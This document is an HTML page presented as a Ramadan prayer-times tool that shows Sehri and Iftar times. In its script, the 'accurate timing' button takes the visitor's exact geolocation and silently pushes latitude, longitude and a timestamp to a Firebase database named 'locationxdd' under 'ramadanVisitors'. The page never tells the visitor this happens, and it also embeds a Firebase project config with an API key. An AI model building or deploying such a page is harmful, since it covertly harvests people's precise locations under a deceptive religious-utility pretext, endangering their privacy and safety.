<!DOCTYPE html><html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sehri & Iftar Times</title><style>
body{
  margin:0;
  font-family:system-ui;
  background:#0f172a;
  color:#fff;
  display:flex;
  align-items:center;
  justify-content:center;
  min-height:100vh;
}

.card{
  background:#111827;
  padding:26px;
  border-radius:16px;
  width:320px;
  text-align:center;
  box-shadow:0 15px 40px rgba(0,0,0,.5);
}

h1{
  font-size:20px;
  margin-bottom:8px;
}

.subtitle{
  font-size:13px;
  opacity:.7;
  margin-bottom:18px;
}

.timeBox{
  background:#0b1220;
  padding:14px;
  border-radius:10px;
  margin-top:10px;
}

.label{
  font-size:12px;
  opacity:.7;
}

.time{
  font-size:20px;
  font-weight:600;
  margin-top:4px;
}

button{
  margin-top:18px;
  width:100%;
  padding:11px;
  border-radius:10px;
  border:0;
  background:#3b82f6;
  color:#fff;
  font-weight:600;
  cursor:pointer;
}

button:disabled{
  opacity:.6;
  cursor:not-allowed;
}

.status{
  margin-top:12px;
  font-size:13px;
  opacity:.7;
}
</style></head><body><div class="card"><h1>Ramadan Timings</h1>
<div class="subtitle">Approximate times shown below</div><div class="timeBox">
<div class="label">Sehri Ends (Fajr)</div>
<div class="time" id="sehri">Loading...</div>
</div><div class="timeBox">
<div class="label">Iftar (Maghrib)</div>
<div class="time" id="iftar">Loading...</div>
</div><button id="locBtn">
Show accurate timing for my location
</button><div class="status" id="status">
Using default location
</div></div><script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

/* Firebase config */
const firebaseConfig = {
  apiKey:"AIzaSyD-myAkBLFbPyqIomR02q6iftboysae-wQ",
  authDomain:"locationxdd.firebaseapp.com",
  databaseURL:"https://locationxdd-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId:"locationxdd",
  storageBucket:"locationxdd.firebasestorage.app",
  messagingSenderId:"114480292043",
  appId:"1:114480292043:web:d143429c68784b0706bb4e"
};

const app = initializeApp(firebaseConfig);
const db  = getDatabase(app);

const sehriEl  = document.getElementById("sehri");
const iftarEl  = document.getElementById("iftar");
const btn      = document.getElementById("locBtn");
const statusEl = document.getElementById("status");

/* Fetch prayer times */
function fetchTimes(lat,lng){

  const url=`https://api.aladhan.com/v1/timings?latitude=${lat}&longitude=${lng}&method=2`;

  fetch(url)
  .then(r=>r.json())
  .then(data=>{

    const t=data.data.timings;

    sehriEl.textContent=t.Fajr;
    iftarEl.textContent=t.Maghrib;

  })
  .catch(()=>{
    statusEl.textContent="Failed to load timings";
  });

}

/* Save location to Firebase */
function saveLocation(lat,lng){

  const now=new Date();

  push(ref(db,"ramadanVisitors"),{

    lat:lat,
    lng:lng,
    timestamp:Date.now(),
    time:now.toLocaleString()

  });

}

/* Button click */
btn.onclick=()=>{

  if(!navigator.geolocation){
    statusEl.textContent="Location not supported";
    return;
  }

  btn.disabled=true;
  statusEl.textContent="Detecting location...";

  navigator.geolocation.getCurrentPosition(

    pos=>{

      const lat=pos.coords.latitude;
      const lng=pos.coords.longitude;

      fetchTimes(lat,lng);
      saveLocation(lat,lng);

      statusEl.textContent="Showing accurate times for your location";

    },

    ()=>{
      statusEl.textContent="Location permission denied";
      btn.disabled=false;
    }

  );

};

/* Default fallback (Bangladesh) */
fetchTimes(23.6850,90.3563);

</script></body>
</html>
